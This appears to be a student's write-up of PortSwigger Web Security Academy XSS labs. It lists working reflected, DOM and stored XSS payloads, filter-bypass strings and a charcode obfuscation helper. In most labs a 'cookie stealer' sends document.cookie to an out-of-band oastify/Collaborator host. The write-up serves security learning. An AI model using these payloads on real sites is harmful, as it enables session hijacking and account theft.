## Approach

1. Use ***Burp Scanner*** particularly on **search bar and comment section**
2. Tags, events, or attributes getting blocked? ***Burp Intruder*** using [this]([Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))
3. If you see any injection points inside a \`\`, use this `${}`, refer to [this](#[7.%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks%20Unicode-escaped](https%20//portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)), you'll need to check this manually, review source code with `<script`

> ***Burp Scanner*** can't detect XSS on the above case

## Labs
### [1. Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

> [!NOTE] 
> Search bar has XSS, it blocks most tags and attributes except some like `body` and `onresize`
> 

***print()* payload**

```html
<iframe src="https://[LAB_URL]/?search=<body onresize='print()'>" onload="style.width='500px'">
```

**Cookie stealer**

```html
<iframe src="https://[LAB_URL]/?search=<body onresize='fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)'>" onload="style.width='500px'">
```

### [2. Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

> [!NOTE] 
> Blocks most except SVG markup, XSS in search function

***alert()* payload**

```html
?search=<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

**Cookie stealer**

```html
?search=<svg><animatetransform onbegin=fetch(`//[BURP_COLLABORATOR]/?c=${btoa(document.cookie)}`) attributeName=transform>
```

### [3. Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

> [!NOTE] 
> Custom tags work, deliver XSS with that

***alert()* payload**

```js
<script>
window.location="https://0a5f00e6040f855e802403f7007f00b6.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)>"
</script>
```

**Cookie stealer**

```js
<script>
window.location="https://0a5f00e6040f855e802403f7007f00b6.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocus=fetch(`//li73q68oy7pa9iv365rc8i8au10toko8d.oastify.com?c=${btoa(document.cookie)}`)>"
</script>
```

### [4. DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
> [!NOTE] 
> Data is read from `location.hash` and passed to `jQuery.parseHTML`.

***print()* payload**

```html
<iframe src="https://[LAB_URL]/#" onload="this.src+='<img src onerror=print()>'">
```

**Cookie stealer**

```html
<iframe src="https://[LAB_URL]/#" onload="this.src+='<img src onerror=fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)>'">
```

### [5. Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

> [!NOTE] 
> There are points for our injection the first is **blog header** non XSS able, the second is inside `<script>` that can be escaped with `</script><script>` allowing XSS 

***alert()* payload**

```html
?search=</script><script>alert()</script>
```

**Cookie stealer**

```html
?search=</script><script>fetch(`//lqf3y6go67xahi33e5zcgiga218twky8n.oastify.com?c=${btoa(document.cookie)}`)</script>
```

### [6. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
> [!NOTE] 
> Just like [before](#[5.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped](https%20//portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)), there's 2 injection points, we're attacking the one inside `<script>` 

***alert()* payload**

```html
?search=\';alert();//
```

**Cookie stealer**

```html
?search=\';fetch(`//kpd2x5fn56w9gh22d4ybfhf9107svjy7n.oastify.com?c=${btoa(document.cookie)}`);//
```

### [7. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

> [!NOTE] Title
> The XSS is inside a template literal allowing XSS using `${}`

**XSS charcode generator (devtools console)**

```js
var url = "//[BURP_COLLABORATOR]?c=";
var payload = [];
for (var i = 0; i < url.length; i++) {
    payload.push(url.charCodeAt(i));
}
console.log(payload.join(","));
```

***alert()* payload**

```js
${alert()}
```

**Cookie stealer**

```js
${fetch(String.fromCharCode(47,47,50,116,119,107,49,110,106,53,57,111,48,114,107,122,54,107,104,109,50,116,106,122,106,114,53,105,98,97,122,50,112,113,101,46,111,97,115,116,105,102,121,46,99,111,109,63,99,61)+btoa(document.cookie))}
```

### [8. Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

> [!NOTE] 
> It has `innerHTML` sink being passed into from the comment being posted, there's flawed validation that only trims the first occurrence of  `<` and `>`

***alert()* payload**

```html
comment=<><img src onerror=alert()>
```

**Cookie stealer**

```html
comment=<><img src onerror=fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)>
```
## Bypasses

### Simple bypass

```
</script><script>alert()</script>
'><script>alert()</script>
"><script>alert()</script>
\'<script>alert()</script>
\"-alert()}//
```

### Charcode bypass

**XSS charcode generator (devtools console)**

```js
var url = "//[BURP_COLLABORATOR]?c=";
var payload = [];
for (var i = 0; i < url.length; i++) {
    payload.push(url.charCodeAt(i));
}
console.log(payload.join(","));
```

**Example Cookie stealer (char coded)**

```js
${fetch(String.fromCharCode(47,47,50,116,119,107,49,110,106,53,57,111,48,114,107,122,54,107,104,109,50,116,106,122,106,114,53,105,98,97,122,50,112,113,101,46,111,97,115,116,105,102,121,46,99,111,109,63,99,61)+btoa(document.cookie))}

// Actual
${fetch('//2twk1nj59o0rkz6khm2tjzjr5ibaz2pqe.oastify.com?c='+btoa(document.cookie))}
```


## Cheat Sheet

[Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
> Portswigger cheatsheet